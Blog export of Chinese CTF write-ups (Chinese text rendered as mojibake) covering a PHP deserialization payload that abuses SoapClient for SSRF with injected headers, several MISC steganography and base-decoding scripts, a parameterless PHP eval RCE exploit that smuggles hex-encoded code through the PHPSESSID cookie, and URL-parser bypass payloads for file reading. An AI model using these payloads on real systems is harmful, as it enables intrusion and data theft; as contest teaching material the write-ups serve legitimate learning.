<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">            <span class="string">"Cookie: PHPSESSID=s8fo8ma30gbttqvgdbb48k6rw3"</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'uri'</span> =&gt; <span class="string">'hello'</span>, <span class="string">'location'</span> =&gt; $target, <span class="string">'user_agent'</span> =&gt; <span class="string">'test^^'</span> . join(<span class="string">'^^'</span>, $headers)));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild = [<span class="string">'action'</span> =&gt; <span class="string">"SELECT"</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence = <span class="keyword">array</span>(<span class="string">"hello"</span> =&gt; <span class="keyword">new</span> Typecho_Db_Query());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o = serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line">$o = preg_replace(<span class="string">" /\^\^/"</span>, <span class="string">"\r\n"</span>, $o);</span><br><span class="line">$r = base64_encode($o);</span><br><span class="line"><span class="keyword">echo</span> $r;</span><br></pre></td></tr></table></figure>

<p>POSTæäº¤payload</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412194618150.png" alt="image-20200412194618150"></p>
<p>æ³¨æ„å°†PHPSESSIDæ”¹æˆè„šæœ¬ä¸­çš„å€¼ï¼ŒGETæäº¤admin=1æ‰“å°flag</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412194656862.png" alt="image-20200412194656862"></p>
<h3 id="8-So-Web-Application"><a href="#8-So-Web-Application" class="headerlink" title="8.So Web Application"></a>8.So Web Application</h3><p>è¿™é“é¢˜å¾ˆæ‡µã€‚</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-åƒå±‚å¥—è·¯"><a href="#1-åƒå±‚å¥—è·¯" class="headerlink" title="1.åƒå±‚å¥—è·¯"></a>1.åƒå±‚å¥—è·¯</h3><p>ç»™äº†ä¸ªå‹ç¼©åŒ…ï¼ŒåŒ…åå°±æ˜¯è§£å‹å¯†ç ï¼Œæœ‰å¾ˆå¤šå±‚ã€‚ã€‚ã€‚</p>
<p>ç›´æ¥è„šæœ¬è·‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">next_file = <span class="string">""</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    file = <span class="string">"0573.zip"</span></span><br><span class="line">    zf = zipfile.ZipFile(file)</span><br><span class="line">    <span class="comment"># f=zf.open('1.xlsx',mode='r',pwd='123456'.encode('utf-8'))</span></span><br><span class="line">    a = zf.namelist()</span><br><span class="line">    next_file = a[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        password = file.replace(<span class="string">".zip"</span>, <span class="string">""</span>)</span><br><span class="line">        zf.extractall(pwd=password)</span><br><span class="line">    <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">    zf.close()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        zf = zipfile.ZipFile(next_file)</span><br><span class="line">        <span class="comment"># f=zf.open('1.xlsx',mode='r',pwd='123456'.encode('utf-8'))</span></span><br><span class="line">        a = zf.namelist()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            password = next_file.replace(<span class="string">".zip"</span>, <span class="string">""</span>)</span><br><span class="line">            <span class="comment"># print password</span></span><br><span class="line">            zf.extractall(pwd=password)</span><br><span class="line">        <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        next_file = a[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> (next_file)</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°qt.txt, 40000ä¸ªåƒç´ ç‚¹ï¼Œä¹Ÿæ˜¯è„šæœ¬è¿˜åŸ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> skimage <span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">img = np.zeros((<span class="number">200</span>,<span class="number">200</span>))</span><br><span class="line">print(img)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'qr.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">            <span class="keyword">if</span> data[i*<span class="number">200</span>+j] == <span class="string">"(255, 255, 255)\n"</span>:</span><br><span class="line">                img[i][j] = <span class="number">255</span></span><br><span class="line">            <span class="keyword">else</span>: img[i][j] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    plt.imshow(img,cmap=<span class="string">'gray'</span>)</span><br><span class="line">    plt.show()</span><br><span class="line">    plt.close()</span><br></pre></td></tr></table></figure>

<h3 id="2-å¯»æ‰¾xxx"><a href="#2-å¯»æ‰¾xxx" class="headerlink" title="2.å¯»æ‰¾xxx"></a>2.å¯»æ‰¾xxx</h3><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413153919998.png" alt="image-20200413153919998"></p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413154311175.png" alt="image-20200413154311175"></p>
<p>æŠŠå¾—åˆ°çš„æ•°å­— <code>18684221609</code> å‘å…¬ä¼—å·</p>
<h3 id="3-Hello-misc"><a href="#3-Hello-misc" class="headerlink" title="3.Hello_ misc"></a>3.Hello_ misc</h3><p>è§£å‹åæ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œå›¾ç‰‡æœ€ä¸Šé¢åªæœ‰çº¢ç»¿ä¸¤ç§é¢œè‰²ã€‚å’Œä¸€ä¸ªflag.rar å¯†ç å‹ç¼©åŒ…</p>
<p>ç”¨foremostä»å›¾ç‰‡ä¸­æå–åˆ°ä¸€ä¸ªå¸¦å¯†ç çš„å‹ç¼©åŒ…ã€‚</p>
<p>æŠŠå›¾ç‰‡çš„çº¢è‰²åŒºåŸŸè£å‰ªå‡ºæ¥ <code>img.png</code></p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/img.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> skimage <span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">img = io.imread(<span class="string">'img.png'</span>)</span><br><span class="line">x = img.shape[<span class="number">0</span>]</span><br><span class="line">y = img.shape[<span class="number">1</span>]</span><br><span class="line">ret = np.zeros((x,y))</span><br><span class="line"><span class="comment">#(255,0,0) çº¢è‰²</span></span><br><span class="line"><span class="comment">#(0,0,255) è“è‰²</span></span><br><span class="line">c=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(y):</span><br><span class="line">        <span class="keyword">if</span>(img[i,j,<span class="number">0</span>]) == <span class="number">255</span>:</span><br><span class="line">            c +=<span class="string">'1'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c += <span class="string">'0'</span></span><br><span class="line"></span><br><span class="line">b = re.findall(<span class="string">r'.&#123;8&#125;'</span>,c)</span><br><span class="line"></span><br><span class="line">d = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    d.append(int(i, <span class="number">2</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'out.png'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">        t = struct.pack(<span class="string">'B'</span>,i)</span><br><span class="line">        f.write(t)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/out.png" alt="out"></p>
<p>å¾—åˆ°out.txt</p>
<p>é‡Œé¢åªæœ‰ <code>127 255 63 191</code> è¿™å››ä¸ªæ•°å­—</p>
<p>çŒœæµ‹ä¸º <code>00 01 10 11</code>çš„ç»„åˆ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permute</span><span class="params">(nums)</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> permutations(nums, len(nums)):</span><br><span class="line">        result.append(list(i))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">bin_list = [<span class="string">'00'</span>, <span class="string">'01'</span>, <span class="string">'10'</span>,<span class="string">'11'</span>]</span><br><span class="line">bin_list=permute(bin_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'out.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ret = f.readlines()</span><br><span class="line">    p = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ret:</span><br><span class="line">        p.append(int(i))</span><br><span class="line"></span><br><span class="line">    out=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> bin_list:</span><br><span class="line">        s = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> p:</span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">63</span>:</span><br><span class="line">                a = i[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">elif</span> j == <span class="number">127</span>:</span><br><span class="line">                a = i[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">elif</span> j == <span class="number">191</span>:</span><br><span class="line">                a = i[<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">elif</span> j == <span class="number">255</span>:</span><br><span class="line">                a = i[<span class="number">3</span>]</span><br><span class="line">            s += a</span><br><span class="line">        out.append(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> out:</span><br><span class="line">    d = re.findall(<span class="string">r'.&#123;8&#125;'</span>,i)</span><br><span class="line">    o = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> d:</span><br><span class="line">        o += chr(int(j, <span class="number">2</span>))</span><br><span class="line">    print(o)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413180554762.png" alt="image-20200413180554762"></p>
<p>å¾—åˆ°flag.rarè§£å‹å¯†ç </p>
<p>è§£å‹å‘ç°</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413180722339.png" alt="image-20200413180722339"></p>
<p>æ‰€ä»¥æ”¹åç¼€ä¸º<code>docx</code></p>
<p>é‡Œé¢æ˜¯ç©ºçš„ ï¼Œä¼¼æ›¾ç›¸è¯†ï¼Ÿ</p>
<p>ç›´æ¥å…¨é€‰ï¼Œæ”¹å­—ä½“é¢œè‰²</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAx</span></span><br><span class="line"><span class="attribute">MTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDEx</span></span><br><span class="line"><span class="attribute">MTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTEx</span></span><br><span class="line"><span class="attribute">MTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTEx</span></span><br><span class="line"><span class="attribute">MTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTEx</span></span><br><span class="line"><span class="attribute">MTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx</span></span><br></pre></td></tr></table></figure>

<p>çœ‹èµ·æ¥åƒbase64éšå†™ï¼Œä½†ä¹‹å‰ç”¨çš„è„šæœ¬æ‰“å°å‡ºæ¥å…¨æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥æ‰¾äº†ä¸ªæ–°è„šæœ¬</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413183342138.png" alt="image-20200413183342138"></p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413183650016.png" alt="image-20200413183650016"></p>
<h3 id="4-pyFlag"><a href="#4-pyFlag" class="headerlink" title="4.pyFlag"></a>4.pyFlag</h3><p>é¢˜ç›®ç»™äº†ä¸‰å¼ å›¾ç‰‡ï¼Œæ”¾åˆ°winhexä¸‹ï¼Œå¯ä»¥å‘ç°å°¾éƒ¨åˆ†åˆ«æœ‰ä¸€ä¸ªéƒ¨åˆ†ï¼Œå°†å®ƒä»¬ç»„åˆåœ¨ä¸€èµ·ï¼Œå¯ä»¥å¾—åˆ°ï¼Œä¸€ä¸ªzipã€‚</p>
<p>ç„¶åçˆ†ç ´å‹ç¼©åŒ…å¯†ç æ˜¯1234</p>
<p>å¾—åˆ°å¯†æ–‡</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">G&amp;e<span class="constructor">OhGcq(ZG(<span class="params">t2</span><span class="operator">*</span>H8M3dG&amp;<span class="params">wXiGcq</span>(ZG&amp;<span class="params">wXyG</span>(<span class="params">j</span>~tG&amp;<span class="params">eOdGcq</span>+<span class="params">aG</span>(<span class="params">t5oG</span>(<span class="params">j</span>~qG&amp;<span class="params">eIeGcq</span>+<span class="params">aG</span>)</span><span class="number">6</span>Q&lt;<span class="constructor">G(<span class="params">j</span>~rG&amp;<span class="params">eOdH9</span>&lt;5qG&amp;<span class="params">eLvG</span>(<span class="params">j</span>~sG&amp;<span class="params">nRdH9</span>&lt;8rG%<span class="operator">++</span><span class="params">qG</span>%<span class="params">__eG</span>&amp;<span class="params">eIeGc</span>+|<span class="params">cG</span>(<span class="params">t5oG</span>(<span class="params">j</span>~sG&amp;<span class="params">eOlH9</span>&lt;8rH8C_qH9&lt;8oG&amp;<span class="params">eOhGc</span>+<span class="params">_bG</span>&amp;<span class="params">eLvH9</span>&lt;8sG&amp;<span class="params">eLgGcz</span>?<span class="params">cG</span>&amp;3|<span class="params">sH8M3cG</span>&amp;<span class="params">eOtG</span>%<span class="params">_</span>?<span class="params">aG</span>(<span class="params">t5oG</span>(<span class="params">j</span>~tG&amp;<span class="params">wXxGcq</span>+<span class="params">aH8V6sH9</span>&lt;8rG&amp;<span class="params">eOhH9</span>&lt;5qG(&lt;E-H8M3eG&amp;<span class="params">wXiGcq</span>(ZG)</span><span class="number">6</span>Q&lt;<span class="constructor">G(<span class="params">j</span>~tG&amp;<span class="params">eOtG</span>%+&lt;<span class="params">aG</span>&amp;<span class="params">wagG</span>%<span class="params">__cG</span>&amp;<span class="params">eIeGcq</span>+<span class="params">aG</span>&amp;M9uH8V6cG&amp;<span class="params">eOlH9</span>&lt;8rG(&lt;HrG(<span class="params">j</span>~qG&amp;<span class="params">eLcH9</span>&lt;8sG&amp;<span class="params">wUwGek2</span>)</span></span><br></pre></td></tr></table></figure>

<p>hint</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">æˆ‘ç”¨å„ç§baseXXç¼–ç æŠŠflagå¥—å¨ƒåŠ å¯†äº†ï¼Œä½ åº”è¯¥ä¹Ÿæœ‰çœ‹å‡ºæ¥ã€‚</span><br><span class="line">ä½†æˆ‘åªç”¨äº†ä¸€äº›å¸¸ç”¨çš„baseç¼–ç å“¦ï¼Œæ¯•ç«Ÿæˆ‘çš„æ™ºåŠ›æ°´å¹³ä½ ä¹ŸçŸ¥é“...åƒä»€ä¹ˆbase36base58å¬éƒ½æ²¡å¬è¿‡</span><br><span class="line">æç¤ºï¼š<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="number">0x30</span>,<span class="number">0x55</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">a = <span class="string">"G&amp;eOhGcq(ZG(t2*H8M3dG&amp;wXiGcq(ZG&amp;wXyG(j~tG&amp;eOdGcq+aG(t5oG(j~qG&amp;eIeGcq+aG)6Q&lt;G(j~rG&amp;eOdH9&lt;5qG&amp;eLvG(j~sG&amp;nRdH9&lt;8rG%++qG%__eG&amp;eIeGc+|cG(t5oG(j~sG&amp;eOlH9&lt;8rH8C_qH9&lt;8oG&amp;eOhGc+_bG&amp;eLvH9&lt;8sG&amp;eLgGcz?cG&amp;3|sH8M3cG&amp;eOtG%_?aG(t5oG(j~tG&amp;wXxGcq+aH8V6sH9&lt;8rG&amp;eOhH9&lt;5qG(&lt;E-H8M3eG&amp;wXiGcq(ZG)6Q&lt;G(j~tG&amp;eOtG%+&lt;aG&amp;wagG%__cG&amp;eIeGcq+aG&amp;M9uH8V6cG&amp;eOlH9&lt;8rG(&lt;HrG(j~qG&amp;eLcH9&lt;8sG&amp;wUwGek2)"</span></span><br><span class="line">a = base64.b85decode(a)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">c = re.findall(<span class="string">r'.&#123;2&#125;'</span>,a.decode())</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    s += <span class="string">'%'</span>+i</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">s = parse.unquote(s)</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">s = base64.b32decode(s)</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">s = base64.b16decode(s.decode())</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(s))</span><br></pre></td></tr></table></figure>

<h3 id="5-Unravel"><a href="#5-Unravel" class="headerlink" title="5.Unravel!"></a>5.Unravel!</h3><p>JM.PNG,å¯ä»¥binwalk ä¸€å¼ å›¾ç‰‡ï¼Œå†…å®¹ä¸ºï¼šTokyo</p>
<p>look_at_the_file_ending.wavæ–‡ä»¶å°¾éƒ¨æœ‰ä¸€ä¸²aes <code>U2FsdGVkX1/nSQN+hoHL8OwV9iJB/mSdKk5dmusulz4=</code></p>
<p>è§£å¼€æ˜¯ <code>CCGandGulu</code> æ˜¯å‹ç¼©åŒ…çš„å¯†ç </p>
<p>åˆ©ç”¨silenteyeè§£å¯†</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200413200509558.png" alt="image-20200413200509558"></p>
<p><a href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020MRCTF" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« </a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>51ELABæ˜“éœ–åšYCTF</title>
    <url>/2020/03/51ELAB%E6%98%93%E9%9C%96%E5%8D%9AYCTF-WP/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-RCE"><a href="#1-RCE" class="headerlink" title="1.RCE"></a>1.RCE</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'var'</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!preg_match(<span class="string">'/et|dir|na|info|dec|oct|pi|log/i'</span>, $_GET[<span class="string">'var'</span>])) &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($_GET[<span class="string">'var'</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Sorry!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>


<p>æ— å‚æ•°RCE</p>
<p>session_id() å¯ä»¥ç”¨æ¥è·å–/è®¾ç½®å½“å‰ä¼šè¯ IDã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨æ­¤æ–¹æ³•æ¥è·å–phpsessionidï¼Œå¹¶ä¸”phpsessionidå¯æ§</p>
<p>eval(hex2bin(session_id(session_start())));å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤</p>
<p>æ¨èçœ‹çœ‹è¿™ç¯‡<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">æ–‡ç« </a>å§¿åŠ¿å¾ˆå…¨</p>
<p>payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span><span class="params">(strs)</span>:</span></span><br><span class="line">    ret=<span class="string">''</span></span><br><span class="line">    b = list(strs)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">        c = hex(ord(i)).replace(<span class="string">"0x"</span>,<span class="string">""</span>)</span><br><span class="line">        ret +=c</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="string">"""def str2hex(strs):</span></span><br><span class="line"><span class="string">	bstrs=bytes(strs,'utf-8')</span></span><br><span class="line"><span class="string">	ret = ''.join(['%02x' %b for b in bstrs])</span></span><br><span class="line"><span class="string">	return ret</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">url= <span class="string">"http://124.193.74.212:36060/?var=eval(hex2bin(session_id(session_start())));"</span></span><br><span class="line">payload=<span class="string">"var_dump(file_get_contents('/flag.txt'));"</span></span><br><span class="line">payload=str2hex(payload)</span><br><span class="line">cookies=&#123;<span class="string">'PHPSESSID'</span>:payload&#125;</span><br><span class="line">res =requests.get(url,cookies=cookies)</span><br><span class="line">print(res.content)</span><br></pre></td></tr></table></figure>

<h3 id="2-SSRF"><a href="#2-SSRF" class="headerlink" title="2.SSRF"></a>2.SSRF</h3><p>è®¿é—®ç›´æ¥è·³è½¬åˆ°ï¼š</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//124.193.74.211:13187/index.php?file=WTNSbWFXMWhaMlV1YW5Cbg==</span></span><br></pre></td></tr></table></figure>

<p>urlä¸€çœ‹æ€€ç–‘æ˜¯ä»»æ„æ–‡ä»¶è¯»å–</p>
<p>ç„¶åæŠŠ <code>index.php</code> ä¸¤æ¬¡base64ç¼–ç  <code>YVc1a1pYZ3VjR2h3</code></p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?file=WTNSbWFXMWhaMlV1YW5Cbg=='</span>);</span><br><span class="line">$file = base64_decode(base64_decode($_GET[<span class="string">'file'</span>]));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'file'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'input_filename:   '</span>. $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"ctf"</span>,<span class="string">"flag"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'real_filename:   '</span>.$file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Hint: hal0flagi5here.php</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°æºç ä¸­æœ‰æç¤º <code>hal0flagi5here.php</code></p>
<p>æ ¹æ®æç¤ºæŸ¥çœ‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$argv[<span class="number">1</span>]=$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>],FILTER_VALIDATE_URL))</span><br><span class="line">&#123;</span><br><span class="line">true$r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">trueprint_r($r);</span><br><span class="line">true<span class="keyword">if</span>(preg_match(<span class="string">'/happyctf\.com$/'</span>,$r[<span class="string">'host'</span>]))</span><br><span class="line">true&#123;</span><br><span class="line">truetrue$url=file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">truetrue<span class="keyword">echo</span>($url);</span><br><span class="line">true&#125;<span class="keyword">else</span></span><br><span class="line">true&#123;</span><br><span class="line">truetrue<span class="keyword">echo</span>(<span class="string">"error"</span>);</span><br><span class="line">true&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">true<span class="keyword">echo</span> <span class="string">"403 Forbidden"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æ˜¯ç»•è¿‡<code>filter_var()</code>å’Œ<code>parse_url()</code>ä»¥åŠ<code>file_get_contents()</code></p>
<p>payload</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">hal0flagi5here.php?url=dict:<span class="regexp">//</span>happyctf.com<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/flag.txt</span></span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">hal0flagi5here.php?url=test:<span class="comment">//happyctf.com/../../../../../../flag.txt</span></span><br></pre></td></tr></table></figure>

